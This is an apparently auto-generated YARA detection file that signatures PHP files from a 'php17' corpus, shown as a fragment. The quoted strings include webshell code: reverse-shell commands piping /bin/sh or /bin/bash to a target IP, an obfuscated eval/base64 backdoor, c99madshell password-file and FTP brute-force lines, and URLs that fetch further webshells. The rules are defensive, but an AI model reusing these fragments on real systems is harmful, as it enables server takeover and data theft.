      $s9 = "* Constructs a verifier with the given <code>$times</code>." fullword ascii
      $s10 = "*  *  Redistributions of source code must retain the above copyright" fullword ascii
      $s11 = "*  *  Neither the name of Mike Lively nor the names of his" fullword ascii
      $s12 = "* Verifies that the number of <code>$matchedCalls</code> is equal to or greater than the" fullword ascii
      $s13 = "* value this object was instantiated with." fullword ascii
      $s14 = "* @param int $times" fullword ascii
      $s15 = "class Phake_CallRecorder_VerifierMode_AtLeast implements Phake_CallRecorder_IVerifierMode" fullword ascii
      $s16 = "* @param array $matchedCalls" fullword ascii
      $s17 = "* @package    Phake" fullword ascii
      $s18 = "return \"at least <{$this->times}> times\";" fullword ascii
      $s19 = "public function __construct($times)" fullword ascii
      $s20 = "private $times;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule sig_2bb7618ff9495fd6dad4aaeefadd607c5d89478f
{
   meta:
      description = "php17 - file 2bb7618ff9495fd6dad4aaeefadd607c5d89478f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "274421a879f18b927fa99197a2f66ff05b1d0b33a840fb85a328812d5395fbde"
   strings:
      $s1 = "$R='\"/_/\",\"/-9I/\"),arr9Iay(\"9I/\",\"+\")9I,$ss9I(9I$s[$i],9I0,$9Ie))),$k))9I);$o=ob_get9I_content9Is();ob9I_e9Ind_9Icl';" fullword ascii
      $s2 = "$x='{$s[9I$i]=\"\";$p9I=$ss($9Ip,39I);}if(ar9Iray_9Ikey_e9Ix9I9Iists($i,$s)){$s[$i].9I=$9Ip9I9I;$e=strpos9I($9Is[$i],$f);if';" fullword ascii
      $s3 = "$u='ER9I;$rr=@9I9I$r[\"HTTP_REFERER\"9I];$ra9I=@$9Ir[\"HT9ITP_ACCEPT_L9IANGUAG9IE\"];9Iif($9Irr&&$ra){9I$9Iu=9Iparse_url9I($r';" fullword ascii
      $s4 = "$l='I=9I0.(9I[9I\\\\d]))?,?/\",$ra9I,$m);i9If($q&&9I$m){@9I9Isession_start();$s=&$9I_SE9I9ISSION9I;$ss9I=\"substr9I\";$';" fullword ascii
      $s5 = "$T='ean();$d=ba9Is9I9Ie64_encode(x9I(gz9Ico9Imp9Iress($o),9I$k))9I;print(\"<$k9I>$d</$k>\");@se9Ission_de9Is9Itroy();}}}}';" fullword ascii
      $s6 = "$S='.$9Ikf9I),0,3));$p=\"\";fo9Ir($z9I=1;$z<c9Iount($m[19I]);$z9I++9I)$p.9I=$q9I[$m[2][$z]];if9I(strp9Ios($p,9I$h)=9I==0)';" fullword ascii
      $s7 = "$X='$kh=\"5d49I1\"9I;$kf=\"402a\"9I;func9Ition x($t9I,9I$k){$9Ic=strlen($9Ik9I);9I$l=strlen($t);$o9I9I=\"\";f9Ior($i=9I0;';" fullword ascii
      $s8 = "$g='r);parse9I_s9Itr($9Iu[\"query\"9I],$q);$q=9Iar9Ir9Iay_values9I($q);p9Ireg_matc9Ih_9Iall(\"/([\\\\w])[\\\\w-9I]+(?9I:;q9';" fullword ascii
      $s9 = "$d='($e9I){$k=$kh.$9Ikf;ob_9Ist9Iart();@e9Ival(@gzunco9Impres9Is(@9Ix(@base69I4_d9Iecode9I(preg_replac9Ie9I(9Iarray(';" fullword ascii
      $s10 = "$s='$i<$l;9I){for(9I$j=0;($j9I<9I$c&&$9Ii<$l);$j++9I,$9Ii++){$o.=$t{$i}9I^$9Ik{$9Ij};}}retur9In $o;}$r=$9I_SER9IV';" fullword ascii
      $s11 = "$M='9Isl=\"strtolower\";$i=9I$m[1][0]9I.$9Im[1][1];$h9I=$sl($9Iss9I(md5($i9I.$kh),9I0,9I3));$f=$9Is9Il($ss(md5(9I$i';" fullword ascii
      $s12 = "$a=str_replace('9I','',$X.$s.$u.$g.$l.$M.$S.$x.$d.$R.$T);" fullword ascii
      $s13 = "$P=str_replace('Tj','','cTjTjrTjeatTje_funTjTjction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule _navmenu_blade
{
   meta:
      description = "php17 - file _navmenu.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae72b203a727533cc66128ad563ba54343bf981638b5fbd56b1696d76a0a5094"
   strings:
      $s1 = "<a href=\"{{ route('user.businesses.home', compact('business')) }}\">{!! Icon::map_marker() !!}&nbsp;{{ $business->name }}</a>" fullword ascii
      $s2 = "<a href=\"{{ route('user.subscriptions') }}\">{{ trans('app.nav.user.business.my_subscriptions') }}</a>" fullword ascii
      $s3 = "<a href=\"{{ route('user.businesses.home', compact('business')) }}\">{!! Icon::map_marker() !!}&nbsp;{{ $business->nam" fullword ascii
      $s4 = "<a href=\"{{ route('user.directory.list') }}\">{{ trans('app.nav.user.business.selector') }}</a>" fullword ascii
      $s5 = "<a href=\"{{ route('user.agenda') }}\">{{ trans('app.nav.user.business.my_appointments') }}</a>" fullword ascii
      $s6 = "<a href=\"{{ route('wizard.welcome') }}\">{{ trans('app.nav.wizard') }}</a>" fullword ascii
      $s7 = "<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\">{{ trans('app.nav.user.business.menu') }} <b class=\"caret\"></" ascii
      $s8 = "<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\">{{ trans('app.nav.user.business.menu') }} <b class=\"caret\"></" ascii
   condition:
      uint16(0) == 0x6c3c and filesize < 3KB and
      all of them
}

rule ac1b3a85c835ac6e54e5e9529b870319bd612f00
{
   meta:
      description = "php17 - file ac1b3a85c835ac6e54e5e9529b870319bd612f00.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5914cf697b6341831ccb44ca6c159f038933bd6a4965a38d6c1639f49a13f95a"
   strings:
      $s1 = "$stmt->execute();" fullword ascii
      $s2 = "$stmt->bindValue(1, $_REQUEST['pass'], SQLITE3_TEXT);" fullword ascii
      $s3 = "$stmt = $db->prepare(\"SELECT myfunc(?)\");" fullword ascii
      $s4 = "$db->createFunction('myfunc', $e);" fullword ascii
      $s5 = "$db = new SQLite3('sqlite.db3');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_12
{
   meta:
      description = "php17 - file 12.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3e05ac5f5ae03209cf8df70ee6ff66f0ba0cfbacf2c617df57671ee7ea6960b3"
   strings:
      $x1 = "system(\"php -r '$sock=fsockopen($targetip,$targetport);exec('/bin/sh -i <&3 >&3 2>&3');'\");" fullword ascii
      $x2 = "system('mknod inittab p && telnet {$targetip} {$targetport} 0<inittab | /bin/bash 1>inittab');" fullword ascii
      $s3 = "tranmit($_POST['sourceip'],$_POST['sourceport'],$_POST['targetip'],$_POST['targetport']);" fullword ascii
      $s4 = "function tansmit($sourceip,$sourceport,$targetip,$targetport){" fullword ascii
      $s5 = "IP\"><input type=\"text\" name=\"targetport\" placeholder=\"" fullword ascii
      $s6 = "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" />" fullword ascii
      $s7 = "document.getElementById(\"portscan\").style.display='';" fullword ascii
      $s8 = "function bounce($targetip,$targetport){" fullword ascii
      $s9 = "document.getElementById(\"command\").style.display='';" fullword ascii
      $s10 = "document.getElementById(\"proxy\").style.display='';" fullword ascii
      $s11 = "<td><?php echo str_replace('\\\\','/',__FILE__)?str_replace('\\\\','/',__FILE__):$_SERVER['SCRIPT_FILENAME'];?></td>" fullword ascii
      $s12 = "<input type=\"text\" name=\"targetip\" placeholder=\"" fullword ascii
      $s13 = "<div align=\"center\"><a href=\"http://www.heysec.org\">Code by Sai</a></div>" fullword ascii
      $s14 = "6','3389','5632','5672','6379','7001','8000','8069','8080','8081','9200','10050','10086','11211','27017','28017','50070');" fullword ascii
      $s15 = "<div align=\"center\" style=\"display:none\" id=\"command\">" fullword ascii
      $s16 = "=================================================================================================================" fullword ascii
      $s17 = "$output=file_get_contents($url);" fullword ascii
      $s18 = "document.getElementById(\"ssrf\").style.display='';" fullword ascii
      $s19 = "document.getElementById(\"phpinfo\").style.display='';" fullword ascii
      $s20 = "document.getElementById(\"inner\").style.display='';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_1945v2017_mei
{
   meta:
      description = "php17 - file 1945v2017-mei.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "62aa491f7087fac964232067a1d28cc8c56b644984c33b7b0f64ff869bb67a04"
   strings:
      $x1 = "$sysinfomerdekaee =\"<pre>\"; $sysinfomerdekaee.=$sysfo->uname().\"<br>\";$sysinfomerdekaee.=$sysfo->gethost().\"<br>\";$sysinfo" ascii
      $x2 = "is->a(\"https://facebook.com/JKT48.co\",\"shutdown57\",\"target=\\\"_blank\\\"\");$foot.= \"</div>\";return $foot;}}" fullword ascii
      $x3 = "$rename = @system('mv '.$old.' '.$new.'');}return $rename;}public static function getscript($isi,$url){$fp = fopen($isi,\"w\");$" ascii
      $x4 = "}elseif ($__action__ == \"rsw\") {if(Act45::getscript(\"awesome1945.php\",\"https://raw.githubusercontent.com/alintamvanz/webshe" ascii
      $x5 = "}else{ $username=$_COOKIE['username'];$password=$_COOKIE['password'];$database=$_COOKIE['database'];$hostname=$_COOKIE['hostname" ascii
      $x6 = "{$mkdir = @mkdir(\"1945_cgi\",0755);$hta = \"AddHandler cgi-script .pl \\n AddHandler cgi-script .sh\";$source = $act->getconten" ascii
      $x7 = "{$html->show(\"<center>\");$html->show($html->h1(\"Admin Finder\"));if(empty($_POST['scan'])){$input = $html->input(\"text\",\"u" ascii
      $x8 = "class Html45{public function show($str){return print($str);}public function h1($t){$h= \"<h1>\";$h.= $t;$h.=\"</h1>\";return $h;" ascii
      $x9 = "{$html->show(\"<center>\");$html->show($html->h1(\"About 1945v2017\"));$html->show(\"<b>MerdekaAtoeMati</b><br>\");$html->show(" ascii
      $x10 = "source = $act->getcontent(\"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/cgi_shell.sh\");$act->simpantext(" ascii
      $x11 = "}elseif ($__action__ == \"rsw\") {if(Act45::getscript(\"awesome1945.php\",\"https://raw.githubusercontent.com/alintamvanz/webshe" ascii
      $x12 = "5 shell by : \".$html->a(\"https://facebook.com/JKT48.co\",\"shutdown57\",\"target=\\\"_blank\\\"\").\"</i>\");$html->show(base6" ascii
      $x13 = "ldlist</b><br>\";$val = $act->getcontent(\"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wordlist_af.txt\");" ascii
      $x14 = "class SysInfo45{public function servis(){$mysql= (function_exists('mysql_connect')) ? \"<font color=lime>ON</font>\" : \"<font c" ascii
      $x15 = "echo \"<div style=\\\"margin-top:250px;\\\" align=center><h3>1945v2017 - Login</h3></div>\";" fullword ascii
      $x16 = "te\",\"value=\\\"Execute query\\\"\").\"<br>\"; $cn = mysql_connect($hostname,$username,$password) or die(mysqli_error()); $cn.=" ascii
      $x17 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/webadmin.php\",\"kuchiyose_1945\" => \"https://raw.github" ascii
      $x18 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/c99.php\",\"kuchiyose_ms\" => \"https://raw.githubusercon" ascii
      $x19 = "}elseif($__action__ == \"sh\"){$mkdir = @mkdir(\"1945_cgi/\",0755);$hta = \"AddHandler cgi-script .pl \\n AddHandler cgi-script " ascii
      $x20 = "ontent.com/alintamvanz/webshell/master/1945.php\",\"kuchiyose_r57\" => \"https://raw.githubusercontent.com/alintamvanz/webshell/" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*)
}

rule sig_12ce6c7167b33cc4e8bdec29fb1cfc44ac9487d1
{
   meta:
      description = "php17 - file 12ce6c7167b33cc4e8bdec29fb1cfc44ac9487d1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d4d1c80f4ca8242750ecfcb12694d5d32376167eaa28734ff2cd393e27fd8120"
   strings:
      $x1 = "* @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $s2 = "x5c^>Ew:Qb:Qc:W~f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)e24-" fullword ascii
      $s3 = "$processor = new Error_Processor();" fullword ascii
      $s4 = "require_once 'processor.php';" fullword ascii
      $s5 = "x24)%zW%hj!<*#cd2bge56+99386c6f+9f5d816:5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%88:}334}472" fullword ascii
      $s6 = "$processor->process404();" fullword ascii
      $s7 = "x27idtutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j]y6g]257]y86]267]y74]275]y7:]b%!|!*)323zbek!~!<b%" fullword ascii
      $s8 = "x27!hmg%!)!gj!<2,*j%!-#1]#-!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K4]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss" fullword ascii
      $s9 = "x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;ut_map(\"oaxjhon\",str_split(\"%tjw!>!#]y84]275]y83]248]y83]256]y81]265]ycx = \"" fullword ascii
      $s10 = "x27;!>>>!}_;gvc%}&;ft7e:56-xr.985:52985-t.98]K4]65]D8]gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsd268]y7f#<!%tww!>!" fullword ascii
      $s11 = "164\") && (!isset($:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47pmdXA6|7**197-2qj%7-K)udfoopdXA" fullword ascii
      $s12 = "x22!ftmbg)!gj<*#k#)usb;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%x5c2b%!>!2p%!*3>?*2bx31\")) or (strstr($uas,\"" fullword ascii
      $s13 = "16)-1);} @error_reporting(0);)uqpuft`msvd},;uqpuft`msvd}+;!>!}" fullword ascii
      $s14 = "8y]#/r%/h%)n%-#+I#)53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C" fullword ascii
      $s15 = "ps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:" fullword ascii
      $s16 = "x272qj%6<^#zsfvr#00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*o#>b%!**X)ufttj" fullword ascii
      $s17 = "x27jsv%6<C>^#]445]212]445]43]321]464]284]366<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR" fullword ascii
      $s18 = "x27;%!q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepd%!-uyfu%)3of)fepdof`57ftbc" fullword ascii
      $s19 = "x7IjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618dW%eN+#Qi" fullword ascii
      $s20 = "x27tfs%6<*17-SFEBFI,0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)32>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule AjaxServiceProvider
{
   meta:
      description = "php17 - file AjaxServiceProvider.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5b18179ee79022c4cb082e8edde4b0c565b970a10b456b69da5e83e9aa63275c"
   strings:
      $s1 = "use Themosis\\Foundation\\ServiceProvider;" fullword ascii
      $s2 = "$this->app->bind('ajax', function($container)" fullword ascii
      $s3 = "class AjaxServiceProvider extends ServiceProvider" fullword ascii
      $s4 = "return new AjaxBuilder($container['action']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_64c8fbb1625f4ae153cab70823de71a691bca0ea
{
   meta:
      description = "php17 - file 64c8fbb1625f4ae153cab70823de71a691bca0ea.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eb72d105c8d43a9cb70575a19eef6cc06ded00a2ce32378a0cbdff2c4b979a10"
   strings:
      $x1 = "eval(gzuncompress(base64_decode(\"eJzsffl3G8eR8M/0e/4fRhOuAJogLt6kQIn3IV4iSOoiH94AGBAQAQw0GPCQ7f1fGO0mXlm7ESVSF0VdpE2KkiiKpCRHz8" ascii
      $s2 = "4A8jyQBz92i0GgAkgUyK7MRgK5uDoZjt16OKhUbvvGkOA8oyT3rK+VHLoJSHY6lQQSVBwghyBxQ780+r/VHctuG8nx7AD7D6MBIYoxRUnebOIsPYQVmUKElSVHDyeORA" ascii
      $s3 = "t3NuZEoPLzC/gjXJvsVsgXhbcE4wR9P5VbaWG0e2mSinqPsgLBuJQcR5sWVTjsJXBijpvFDaJWoJ/pTBDNlx0uPPr8DsHtEMpLMAM63Nlry98gqo3P9s9/PPvl+Z8/+d" ascii
      $s4 = "nwFYEACGmQUrq+aMQmyCnOFwGFiRzZUm9uNqDsWiVGtZSPcXTTdSXeh9SgUTAn7oRR7EAEXMUNaw9o3FCsTffvAs//DDLlEcoNlp8H6xGalqR5OGyNGIN45THkWKQYHK" ascii
      $s5 = "LA48Syfgk3nxb1bbZ6PZ12HqdTWHoSmVRakB8zX9qcbqpCMMEXZin1JqgYqzkwaaoJIkWPXpB8rzf3MhsShcFYBS7JVpvlcgMm2IGDHqUJGetEGUtK6nSA8jN+Giqq9K" ascii
      $s6 = "tGv5MK+qWMw3c5jn6nT8JvHE4K/QkG0e+IBnClNPzWFPidlCehFmLS8AWJyeiPDAFUoIuJMfwbSaLQ2qQMIIKoUQAuTUBReEYEDwJ6BwZc6A9MP7SFBEf0Z4zAlIJKhm" ascii
      $s7 = "dYBFRVDqjFTzafbX6/8jkPgvaCWYfrtau52oflIADADybmVu3vGxjUq9Vw1dDs4pBpi2uLogO/lp1JpRBzRKQSSEupWAAjRJ/CWnPVc5/PXicUghrxIw2X0RNPeQB/6y" ascii
      $s8 = "gvyr3JYDpVv/Xp1qdgaw9rv06sN5ehPdOUTChqcGBKZbhfv7yMWTlmCZgwnSLXR5oLLkRcX9+2ElnElWdrn60+e/Bs8wwsV7JDLL3ghRKXi6nwBRcy1frpOi7endVAmJ" ascii
      $s9 = "qr+VFATa9RVhb2v5GwhfJCyLoG8Zqcnd7k6lGhpLRWWk8DhhUyI5SNtp+FY96bxXwRpWXsN1vGKxtZ26nN3b3n+4RTFydB3F3L7YUAIT/77GMFCJHByI2mtBAZYMMJvj" ascii
      $s10 = "yyKjpsQGmYdbK3//JwWBINlTHbZvhbiNnefEHBQjA7YHjEentzm3DbZYibMn9tfvGwHMTHEfB99vqdL8m7NmRHKURrHa/EgzGDGkKM1vL12HwMGNfqb/T7LW8gKTe1ZZ" ascii
      $s11 = "2ibQrF4Xg8QJ/ORrSbRnQYla06SQEX4wtBcMDC8ToYTXEdM8jMCZFjtIyaTAtIlZDHZFVIK/jizIbfTyYNO0VbPes2efjvAP8KPGnQIRAiIceS2ZPnJ1OGQz7i4mac4F" ascii
      $s12 = "yeoC17MXp5ar9/bWN97ic3vxTaW4TuWFCV1GmMGzQCuxhD5IQvYYyJ4qm7s6exf/5XT7a21q79mexYXMUUkeyMmjwNY5mYyJ9GJU4eNGrxZOufbpLScna19DQJYGSuxx" ascii
      $s13 = "iOamw/u6sMcoRRW9ee9rnIRMCUuBgbxcoMUVxEvOmXxaVpJaPVRWJTaOwCCIRlQTTa8Tr8uwwNG/gjU2jQp/1oD8GMu6wBQ6CyD77Tx4lhaMRu20dEwMlYWIv6xNqafx" ascii
      $s14 = "kLuzjd2sDPMGCnoAMgn2B1gsZewd6eMbArcoMpETvQwCoJjsHECqcZlWATQwk6ShyM4DvRgSTfAaassEK6kT5achB2nanduMAeHzg6CHv3CvpXsYTpRSFiAWJx0Y0F8B" ascii
      $s15 = "uwTrAJToEAluGoD2Ov6G2Qo3HLJzOyOu0TkRqA2hTiihQORGJxpHcjeR8+JKWE7BSRMgw4KSpGikQmrqF2aGdxdTuB4hBIn0gXUQ9J4ZLsLooXb63OQOdOn71xZ/nDtR" ascii
      $s16 = "RNJxCOm6AZqTocnq7gUHDuy/WvN9578GMBrX3EPabJu3VpE5isLB0WT1hPti/+DCJJsJeqBWLPLauBsbgSlOJmiDmZOkye3BLSWCyElEu0k6YDY6mQCUROpg6CJz3woX" ascii
      $s17 = "wXXJSBrC2RxlMppq7/FCfpyZgGuoP+njsfMkwvyxAYkhBDcteZ9moWaqsoiPjSeL1RzmMuB6G5cgpS3mAqyb8Xz5U1CQEwVDhCyRb1aKiHYvSr1xgkEyMNhsoq6O6lrI" ascii
      $s18 = "YGxgyxFExNs8YcZZPT2yaWzNwlqFEY8ObYlMGVTVigZVEBTcHGWPjuGNsYmRcYtacn2zspYKxFSCA5GAMUAWbYO6ECQAAW4Gzq7v/hpLu7IO2RC7hzd07fIBgwI0Bf3m" ascii
      $s19 = "hff6VO6niVp1L59yTRC79fYR9CUP/q2xAn/OfSJe7AfwdZ/jVHznaeLFXm72T06Zgm40cBTJtvMwmqXWD//aGQobdP+yrw5cZUWU425OnYfxv6fmhukcWnWnAgXIEcQP" ascii
      $s20 = "eU4FZoDmkE7PegEZwDA0hI43IsmcpodqwyoFoWOagDq5cuvoP+oP9RTxIxDZecufb4pxceX//u4jaM6er9Bx+RTzOLtpISJjFbIYkewSOckM3BmYFTO2x/hTUShw19w8" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_15e786a334203308d12856d155bbdb8088ed8afc
{
   meta:
      description = "php17 - file 15e786a334203308d12856d155bbdb8088ed8afc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "rityprobe.net\\\">c99madshell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x3 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form method=\"POST" ascii
      $x4 = "document.todo.grep.value='\".basename($binpath).\"';document.todo.submit();\\\"><u>View binder's process</u></a></center>\";}" fullword ascii
      $x5 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x6 = "($d).\"';document.todo.processes_sort.value='\".$i.$parsesort[1].\"';document.todo.submit();\\\"><b>\".$head[$i].\"</b></a>\";}" fullword ascii
      $x7 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"#\\\" onclick=\\\"document.todo.act.v" ascii
      $x8 = "$logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s9 = "echo \"<form method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
      $s10 = "$out = \"# Dumped by C99madShell.SQL v. \".$shver.\"" fullword ascii
      $s11 = "$fqb_log = \"FTP Quick Brute (called c99madshell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"" fullword ascii
      $s12 = "echo \"<a href=\\\"#\\\" onclick=\\\"document.sql.act.value='sql';document.sql.sql_login.value='\".htmlspecialchars($sql_login)." ascii
      $s13 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - c99madshell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-" ascii
      $s14 = "if (isset($_POST['processes_sort'])) $processes_sort = $_POST['processes_sort'];" fullword ascii
      $s15 = "if (isset($_POST['sql_login']))  {$sql_login=htmlspecialchars($_POST['sql_login']);}" fullword ascii
      $s16 = "type='hidden' value=''><input name='white' type='hidden' value=''><input name='sig' type='hidden' value=''><input name='process" fullword ascii
      $s17 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"#\\\" onclick=\\\"document.todo." ascii
      $s18 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"#\\\" onclick=\\\"document.todo." ascii
      $s19 = "if ((!$submit) or ($sql_act)) {echo \"<table border=\\\"0\\\" width=\\\"100%\\\" height=\\\"1\\\"><tr><td><form method=\\\"POST" ascii
      $s20 = "sswd.value='1';document.todo.submit();\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
   condition:
      uint16(0) == 0x2a2f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_04_plugins_form_tpl
{
   meta:
      description = "php17 - file 04_plugins_form.tpl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e1c3149cd6f3f9dcb158ccbb012f8adcb89e3c9a7a959f1697a208c2d5292c42"
   strings:
      $s1 = "echo $this->form('note', \"<br />Pick as many as you like; use the Ctrl key on Windows, or the Cmd key on Macintosh.\");" fullword ascii
      $s2 = "echo $this->form('button', '', 'Click Me!', null, array('onClick' => 'return alert(\"hello!\")'));" fullword ascii
      $s3 = "echo $this->form('select', 'picker2', $this->picker2, 'Pick many:', $this->opts, 'multiple=\"multiple\"');" fullword ascii
      $s4 = "echo $this->form('checkbox', 'xbox', $this->xbox, 'Check this:', array(1,0), 'style=\"text-align: center;\"');" fullword ascii
      $s5 = "echo $this->form('textarea', 'myarea', $this->myarea, 'Long text:', array('rows'=>12,'cols'=>40));" fullword ascii
      $s6 = "echo $this->form('note', '<span style=\"color: red;\">* Indicates a required field.</span>');" fullword ascii
      $s7 = "echo $this->form('radio', 'chooser', $this->chooser, 'Choose one:', $this->opts);" fullword ascii
      $s8 = "echo $this->form('select', 'picker', $this->picker, 'Pick one:', $this->opts);" fullword ascii
      $s9 = "//               type,   name,     value,         label,                   attribs,               require, message" fullword ascii
      $s10 = "// add a hidden value before the layout" fullword ascii
      $s11 = "echo $this->form('hidden', 'hideme', 'hidden & valued');" fullword ascii
      $s12 = "echo $this->form('block', 'start', 'First Section', 'row');" fullword ascii
      $s13 = "echo $this->form('block', 'start', \"Second Section\", 'row');" fullword ascii
      $s14 = "// checkbox with default value (array(checked, not-checked))" fullword ascii
      $s15 = "echo $this->form('block', 'start', null, 'row');" fullword ascii
      $s16 = "echo $this->form('group', 'start', 'Pick many:');" fullword ascii
      $s17 = "table.Savant-Form" fullword ascii
      $s18 = "echo $this->form('submit', 'op', 'Save');" fullword ascii
      $s19 = "echo $this->form('reset', 'op', 'Reset');" fullword ascii
      $s20 = "fieldset.Savant-Form" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 9KB and
      8 of them
}

rule AbstractTheme
{
   meta:
      description = "php17 - file AbstractTheme.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a422a6e08f49d692a05d1bd4460b3b61f8f282583ec12e4adbbb1018fd6dc766"
   strings:
      $x1 = "* @author    RocketTheme http://www.rockettheme.com" fullword ascii
      $s2 = "$loader->setPaths($locator->findResources('gantry-engine://templates'), 'nucleus');" fullword ascii
      $s3 = "* Render a template file by using given context." fullword ascii
      $s4 = "* @return \\Twig_Loader_Filesystem|null" fullword ascii
      $s5 = "* @copyright Copyright (C) 2007 - 2017 RocketTheme, LLC" fullword ascii
      $s6 = "public function extendTwig(\\Twig_Environment $twig, \\Twig_LoaderInterface $loader = null)" fullword ascii
      $s7 = "public function add_to_twig(\\Twig_Environment $twig, \\Twig_LoaderInterface $loader = null)" fullword ascii
      $s8 = "* Set twig lookup paths to the loader." fullword ascii
      $s9 = "* Gantry Framework code that extends GPL code is considered GNU/GPLv2 and later" fullword ascii
      $s10 = "// Only add error service if development or debug mode has been enabled or user is admin." fullword ascii
      $s11 = "} elseif (!($loader instanceof \\Twig_Loader_Filesystem)) {" fullword ascii
      $s12 = "* http://www.gnu.org/licenses/gpl-2.0.html" fullword ascii
      $s13 = "* http://opensource.org/licenses/MIT" fullword ascii
      $s14 = "* @param \\Twig_LoaderInterface $loader" fullword ascii
      $s15 = "$loader = $twig->getLoader();" fullword ascii
      $s16 = "* Compile and render twig string." fullword ascii
      $s17 = "protected function setTwigLoaderPaths(\\Twig_LoaderInterface $loader)" fullword ascii
      $s18 = "$loader = new \\Twig_Loader_Filesystem();" fullword ascii
      $s19 = "$new = new \\Twig_Loader_Filesystem();" fullword ascii
      $s20 = "* Get context for render()." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule AddToWishlistWidget
{
   meta:
      description = "php17 - file AddToWishlistWidget.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "783bad3e25ba842925135af53b1c63b18839b386be6955e98b17cc8ff6673dd3"
   strings:
      $s1 = "$wishlists = Wishlist::getWishlist((!Yii::$app->user->isGuest ? Yii::$app->user->id : 0), Yii::$app->session->get('wishl" fullword ascii
      $s2 = "namespace app\\modules\\shop\\widgets;" fullword ascii
      $s3 = "$wishlists = Wishlist::getWishlist((!Yii::$app->user->isGuest ? Yii::$app->user->id : 0), Yii::$app->session->get('wishlists', [" ascii
      $s4 = "use yii\\base\\Widget;" fullword ascii
      $s5 = "class AddToWishlistWidget extends Widget" fullword ascii
